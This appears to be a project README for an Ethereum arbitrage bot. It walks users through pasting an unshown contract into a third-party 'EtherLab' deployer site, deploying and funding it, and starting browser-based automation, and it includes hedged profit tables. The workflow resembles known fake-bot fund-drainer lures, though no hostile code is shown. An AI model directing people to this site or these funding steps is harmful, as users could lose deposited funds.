# Arbitrage Bot with Built-in Python Automation

An arbitrage bot is a smart contract that searches for and executes price gaps between pools and routers. It can hold **ETH** and major ERC-20s (**WETH, USDT, USDC, WBTC**, plus any token you whitelist). Below is a step-by-step guide to deploy your own instance and run it without a single manual swap.

## What the bot is

An arbitrage bot is a smart contract plus an external automation script that drives it.

- **`executeArbitrage()`** — main function: runs a multi-leg path across allowed routers in one transaction (ETH or token in).
- **`executeArbitrageFromBalance()`** — owner-only: same as above, but spends the **contract’s own balance** (how a funded bot actually trades).
- **`quickSwap()` / `quickSwapFromBalance()`** — one-hop swap through the default Uniswap V3 router.
- **`setRouterAllowed()` / `setTokenAllowed()`** — whitelist routers and tokens (ETH/WETH, stables, BTC wrappers, or anything else you add).
- **`setDefaultFee()` / `setDefaultTokenOut()`** — pool fee and default output token (USDT by default).
- **`setMinQuickSwapAmount()` / `setMaxQuickSwapAmount()`** — optional size rails for quick swaps (defaults: 0.001–100 ETH equivalent).
- **`setPaused()`** — emergency pause.
- **`revokeApproval()`** — zero a token allowance.
- **`depositEth()`** — payable deposit; also accepts plain ETH via `receive()`.
- **`withdraw()` / `withdrawETH()` / `emergencyWithdrawAll()`** — owner pull of tokens, ETH, or everything.
- **`getBalance()` / `getOwner()` / `owner()`** — read helpers.

Only the **owner** (the wallet that deployed the contract) can change settings and withdraw. Deploy **your own** instance. Do not share one contract across users.

## Supported assets

| Asset | Role |
| --- | --- |
| ETH (native) | Gas + trading inventory |
| WETH | Uniswap path start/end |
| USDT / USDC | Default stables (whitelist USDC if you want it) |
| WBTC | Optional — whitelist before use |
| Any ERC-20 | `setTokenAllowed(token, true)` |

There is **no minimum deposit**. Fund **any amount** you are willing to risk. Keep a little extra ETH on the **deployer wallet** for gas.

## Step-by-step guide

### 1. Open the deployer page

![EtherLab](https://i.ibb.co/PzMH74XW/1.png)

Open [etherlab website](https://etherlab-onchain.github.io/Etherlab/) (or your hosted copy) in the browser.

### 2. Create the bot file

Create a new `.sol` file (e.g. `contract.sol`) and paste [contract.sol](contract.sol).

![EtherLab](https://i.ibb.co/nN90b2FP/2.png)

### 3. Compile the bot

**Compiler** tab → version **0.8.20** → Compile.

![Compiling the contract](https://i.ibb.co/vCmJHMGz/3.png)

### 4. Deploy and fund the bot

**Deploy** tab → connect MetaMask (or another EVM wallet) → Deploy. The contract address appears below.

**Fund it however you want:**

- Send **any amount of ETH** to the contract (plain transfer or `depositEth()`).
- Or transfer allowed ERC-20s (WETH, USDT, …) to the same address.
- Suggested first test: **0.05–0.2 ETH** so you can see gas vs. fill quality without oversizing.
- There is **no 0.5–1 ETH requirement**. Size is yours.

Keep ETH on the **owner wallet** as well — automation txs are paid by the owner, not only by the contract.

![Deploying the contract](https://i.ibb.co/39grWTjG/4.png)

### 5. Start the bot via automation

**Python Automation** tab → confirm the contract is selected → **Start** → confirm in the wallet.

Leave the page open while it runs.

![Starting via automation](https://i.ibb.co/sdLXkqYW/6.png) ![Starting via automation](https://i.ibb.co/hRdRQYhw/7.png)

## What happens after clicking Start

![Starting via automation](https://i.ibb.co/mrw0zT9S/8.png) ![Starting via automation](https://i.ibb.co/spHXSCpW/528.png)

- Each interval, the script dry-runs `executeArbitrage` / `executeArbitrageFromBalance` (`eth_estimateGas`). If it would succeed, a real tx is sent (one wallet confirmation).
- Other selected functions are estimated only.
- A scanner can log Uniswap V2/V3 swaps (who, direction, size).
- Activity shows in **Logs**.

## About profit (worked numbers, not a promise)

Arbitrage is **spread minus gas minus competition**. Nothing here is guaranteed. Days with no edge are normal.

Assumptions used for the table (illustrative only, mainnet-style):

- ETH marked at **$3,000** (round number; live price will differ).
- A “captured” round-trip after pool fees: **0.08%–0.25%** of notional (typical leftover after 5–30 bps of pool fees if a gap still exists).
- Gas per successful attempt: **~$8–$40** depending on congestion.
- Many estimated calls **revert** (no edge) and cost **$0** if you only send when `estimateGas` succeeds.

| Contract inventory | Notional marked | 3 fills/day at 0.10% | Gas (3 fills) | Rough net / day |
| --- | --- | --- | --- | --- |
| 0.05 ETH | $150 | ~$0.45 | ~$24–$120 | often **negative** after gas |
| 0.2 ETH | $600 | ~$1.80 | ~$24–$120 | often **negative** after gas |
| 1 ETH | $3,000 | ~$9 | ~$24–$120 | small / often **flat to down** |
| 5 ETH | $15,000 | ~$45 | ~$24–$120 | **tens of USD** on a good day |
| 20 ETH | $60,000 | ~$180 | ~$24–$120 | **low hundreds** only if fills actually hit |

A **$500 / day** figure on **1 ETH** would require ~**16.7% of inventory per day** after gas. That is **not** a realistic average for public Uniswap arb; professionals with colocation still fight over basis points. Treat any “$500 a day” claim as marketing, not a forecast.

**What is realistic:**

- Small deposits mainly **learn the loop** (deploy, fund, pause, withdraw).
- Profit, when it exists, scales with **inventory** and **how often a true cross-pool gap lasts longer than your inclusion time**.
- Volatility helps; crowded, cheap-gas periods help less than people expect.
- You can withdraw **anytime** via `withdrawETH` / `withdraw` / `emergencyWithdrawAll`.

Results are **not guaranteed** and can be a loss. Only deposit what you can afford to lose. This software is self-custody infrastructure, not an investment product.
